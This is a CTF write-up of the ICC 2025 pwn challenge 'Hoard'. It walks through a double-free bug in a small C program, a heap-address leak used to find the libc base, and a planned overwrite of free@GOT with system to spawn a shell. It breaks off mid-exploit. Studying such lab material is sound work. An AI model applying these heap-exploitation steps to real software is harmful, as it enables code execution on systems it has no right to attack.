<h3> International Cybersecurity Challenge 2025 </h3>

Hey guys, h4cky0u here, I participated with team AFRICC at the ICC 2025 Tokyo, Japan.
<img width="1920" height="892" alt="image" src="https://github.com/user-attachments/assets/df0bbfd0-9b7d-425f-809c-92c7cfe66fcd" />

I mainly focused on the binary exploitation challenges where i solved 3/6 challenges.

This writeup contains the solution for the challenge named `Hoard` which had three solves and i was the 3rd blood..
<img width="1917" height="738" alt="image" src="https://github.com/user-attachments/assets/bd0cfbd8-defc-41f8-8dc2-034613841a10" />

```
Name: Hoard
Desc: Hoarding flags in a CTF is a shameful behavior and should be stopped.
Author: ptr-yudai
Link: http://hoard.org/
```

Here's the link to the attachment: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ICC25/files/firectf_icc-2025-whylz_distfiles_hoard-6543862fd682e5d69103645ac29369e3.tar)

We are provided with this files

```
~/Desktop/CTF/ICC25/Hoard/hoard ❯ ls -l
.rw-r--r-- mark mark 165 B  Thu Jan  1 00:00:00 1970 compose.yml
.rw-r--r-- mark mark 424 B  Thu Jan  1 00:00:00 1970 Dockerfile
.rw-r--r-- mark mark  11 B  Thu Jan  1 00:00:00 1970 flag.txt
.rwxr-xr-x mark mark  16 KB Thu Jan  1 00:00:00 1970 hoard
.rwxr-xr-x mark mark 473 KB Thu Jan  1 00:00:00 1970 libhoard.so
.rw-r--r-- mark mark 749 B  Thu Jan  1 00:00:00 1970 main.c
.rw-r--r-- mark mark  43 B  Thu Jan  1 00:00:00 1970 run
```

Kinda weird the timestamp all shows `Thu Jan 1 1970` when today's date is `Wed Nov 12 2025`

Looking through the docker file:

```
FROM ubuntu:24.04@sha256:04f510bf1f2528604dc2ff46b517dbdbb85c262d62eacc4aa4d3629783036096 AS base
RUN apt-get update && apt-get install libstdc++6
WORKDIR /app
ADD --chmod=555 run .
ADD --chmod=555 hoard .
ADD --chmod=555 libhoard.so .
ADD --chmod=444 flag.txt /flag.txt
RUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt

FROM pwn.red/jail
COPY --from=base / /srv
ENV JAIL_TIME=300 JAIL_CPU=100 JAIL_MEM=10M
```

It basically just generates a random file name (this probably suggesting our goal is to get code execution) before setting up the red pwn jail.

So the important files we need to check now are: `run, hoard & libhoard.so`

The first file: basically sets the `LD_PRELOAD` variable to the shared library `libhoard.so`

```bash
#!/bin/sh
LD_PRELOAD=./libhoard.so ./hoard
```

We are given the binary source code so there's no need for reverse engineering...

```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void reads(const char *prompt, char *buf, size_t len) {
  write(1, prompt, strlen(prompt));
  for (size_t i = 0; i < len; i++) {
    if (read(0, buf + i, 1) != 1)
      _exit(1);
    if (buf[i] == '\n') {
      buf[i] = '\0';
      break;
    }
  }
}

unsigned readi(const char *prompt) {
  char buf[0x10] = { 0 };
  reads(prompt, buf, sizeof(buf)-1);
  return (unsigned)atoi(buf);
}

char *note;

int main() {
  for (size_t i = 0; i < 0x100; i++) {
    switch (readi("> ")) {
      case 1: reads("data: ", note = malloc(8), 8); break;
      case 2: write(1, note, strlen(note)); write(1, "\n", 1); break;
      case 3: free(note); break;
      default: _exit(0);
    }
  }
  _exit(0);
}
```

Pretty straight forward code
- We can make up to 256 allocations where the size is constant
- The pointer is stored in the global variable `note`
- We can free the pointer stored in note as many times as we want

Some things to take note of:
- No IO functions being used
- _exit() is used

So now that we know how the code works, how to exploit it? 

Well the bug there is pretty obvious, after it frees the chunk it doesn't set the pointer to null this means we can double free a chunk and as well a Read-After-Free.

From the challenge description and setup code we see that it makes use of the `libhoard.so` file

I wasn't familiar with what Hoard meant but luckily the link to the source was given
<img width="1920" height="697" alt="image" src="https://github.com/user-attachments/assets/5c1f6dd8-6ff8-4934-ae2b-891b428b979d" />

So `Hoard` is essentially a memory allocator, others we have are `dlmalloc, ptmalloc, jemalloc` etc.

The project is open source so we can grab the source code from: [here](https://github.com/emeryberger/Hoard)

Since this is a memory allocator understanding a bit of how the (de)allocations works is necessary (i guess?)

I won't explain that here, you can read this [paper](https://www.cs.utexas.edu/~mckinley/papers/asplos-2000.pdf)

Hoard allocates memory from the system in chunks we call superblocks. Each superblock is an array of some number of blocks (objects) and contains a free list of its available blocks maintained
in LIFO order to improve locality. All superblocks are the same size (S), a multiple of the system page size. Objects larger than half the size of a superblock are managed directly using the virtual memory system (i.e., they are allocated via mmap and freed usingmunmap). All of the blocks in a superblock are in the same size class. By using size classes that are a power of b apart (where b is greater than 1) and rounding the requested size up to the near-est size class, we bound worst-case internal fragmentation within a block to a factor of b. In order to reduce external fragmentation, we recycle completely empty superblocks for re-use by any size class.

Anyways let's get to exploitation..

First `malloc` is hooked by the `libhoard.so` library to call this function

```c
#if defined(__GNUG__)
  void * xxmalloc (size_t sz)
#else
  void * __attribute__((flatten)) xxmalloc (size_t sz) __attribute__((alloc_size(1))) __attribute((malloc))
#endif
  {
    if (isCustomHeapInitialized()) {
      void * ptr = getCustomHeap()->malloc (sz);
      if (ptr == nullptr) {
	fprintf(stderr, "INTERNAL FAILURE.\n");
	abort();
      }
      return ptr;
    }
    // We still haven't initialized the heap. Satisfy this memory
    // request from the local buffer.
    void * ptr = initBufferPtr;
    initBufferPtr += sz;
    if (initBufferPtr > initBuffer + MAX_LOCAL_BUFFER_SIZE) {
      abort();
    }
    {
      static bool initialized = false;
      if (!initialized) {
	initialized = true;
#if !defined(_WIN32)
	/* fprintf(stderr, versionMessage); */
#endif
      }
    }
    return ptr;
  }
```

And `free`

```c
#if defined(__GNUG__)
  void xxfree (void * ptr)
#else
  void xxfree (void * ptr)
#endif
  {
    getCustomHeap()->free (ptr);
  }
```

Since this is a heap challenge this means we need to do heap related attacks, and we know this allocator manages free list using a LIFO data structure (similarly to Tcache)

But first there's something that we should take note of

During allocation, hoard first checks if the heap is already initialized and if it isn't initializes the heap and the memory allocated is gotten from making a `mmap` syscall

One thing about that is, when a chunk of memory is allocated using `mmap` the offset between the libc region and that memory is usually a bit constant 

So suppose we have an address of an mmap'ed chunk then we can offset it to get the libc base

To achieve this we need to first leak the address of the chunk, and we can do this using a double free

```python
def solve():
    for _ in range(0x10):
        read(b"A"*8)
    
    for _ in range(2):
        free()
    
    global_heap = write() 
    libc.address = global_heap - 0x3c0160
    info("global heap: %#x", global_heap)
    info("libc base: %#x", libc.address)
```

With libc leak gotten now we corrupt the pointer in the freelist to gain arb write 

Limitation with that is we can only write 8 bytes into the allocated memory...

What now? 

Checking the protection on libc we get this

```
~/Desktop/CTF/ICC25/Hoard/hoard/pew ❯ checksec libc.so.6 
[*] '/home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

So the GOT isn't writable, but that doesn't apply to the shared library `libhoard.so`

```
~/Desktop/CTF/ICC25/Hoard/hoard/pew ❯ checksec libhoard.so 
[*] '/home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

The library is mapped into memory

```
gef> vmmap
[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00005592773dd000 0x00005592773de000 0x0000000000001000 0x0000000000000000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched
0x00005592773de000 0x00005592773df000 0x0000000000001000 0x0000000000001000 r-x /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched  <-  $rip
0x00005592773df000 0x00005592773e0000 0x0000000000001000 0x0000000000002000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched
0x00005592773e0000 0x00005592773e1000 0x0000000000001000 0x0000000000002000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched  <-  $r14
0x00005592773e1000 0x00005592773e4000 0x0000000000003000 0x0000000000003000 rw- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/hoard_patched
0x00007f3dc8400000 0x00007f3dc84a2000 0x00000000000a2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc84a2000 0x00007f3dc85d2000 0x0000000000130000 0x00000000000a2000 r-x /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc85d2000 0x00007f3dc8660000 0x000000000008e000 0x00000000001d2000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc8660000 0x00007f3dc866f000 0x000000000000f000 0x000000000025f000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc866f000 0x00007f3dc8672000 0x0000000000003000 0x000000000026e000 rw- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.34
0x00007f3dc8672000 0x00007f3dc8676000 0x0000000000004000 0x0000000000000000 rw-
0x00007f3dc8800000 0x00007f3dc8828000 0x0000000000028000 0x0000000000000000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc8828000 0x00007f3dc89b0000 0x0000000000188000 0x0000000000028000 r-x /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc89b0000 0x00007f3dc89ff000 0x000000000004f000 0x00000000001b0000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6  <-  $r10, $r11
0x00007f3dc89ff000 0x00007f3dc8a03000 0x0000000000004000 0x00000000001fe000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc8a03000 0x00007f3dc8a05000 0x0000000000002000 0x0000000000202000 rw- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libc.so.6
0x00007f3dc8a05000 0x00007f3dc8a12000 0x000000000000d000 0x0000000000000000 rw-
0x00007f3dc8b10000 0x00007f3dc8b21000 0x0000000000011000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8b21000 0x00007f3dc8b9e000 0x000000000007d000 0x0000000000011000 r-x /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8b9e000 0x00007f3dc8bfe000 0x0000000000060000 0x000000000008e000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8bfe000 0x00007f3dc8bff000 0x0000000000001000 0x00000000000ed000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8bff000 0x00007f3dc8c00000 0x0000000000001000 0x00000000000ee000 rw- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007f3dc8c00000 0x00007f3dc8c07000 0x0000000000007000 0x0000000000000000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c07000 0x00007f3dc8c0c000 0x0000000000005000 0x0000000000007000 r-x /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c0c000 0x00007f3dc8c0e000 0x0000000000002000 0x000000000000c000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c0e000 0x00007f3dc8c0f000 0x0000000000001000 0x000000000000e000 r-- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
0x00007f3dc8c0f000 0x00007f3dc8c10000 0x0000000000001000 0x000000000000f000 rw- /home/mark/Desktop/CTF/ICC25/Hoard/hoard/pew/libhoard.so
```

So this means if we can overwrite the got of a function here then we can get rip control (limited to just 8 bytes)

What to do? I did try use one gadget but as expected it failed!

Then i thought of checking the (xx)malloc/free function code path to see if there's any function pointer that resides in a rw region which i could overwrite to a  one gadget but i didn't do that because i feared i might not find any or, one gadget constraint might not be satisfied..

With this, I decided to take the path that would let me either build a ROP chain or call system("/bin/sh").

Doing the latter seems much easier, because if I can overwrite `free@GOT` with `system` and make the note contain `/bin/sh`, then it’s profit, right?

Unfortunately it wasn't as easy as that!

Here i can easily get arbitrary 8 bytes write
<img width="1920" height="1024" alt="image" src="https://github.com/user-attachments/assets/fb2baa71-1242-4e57-93e0-f0f1c7526c50" />
<img width="1920" height="126" alt="image" src="https://github.com/user-attachments/assets/d8859501-b52c-4af6-bfde-bc7b41ed17bd" />










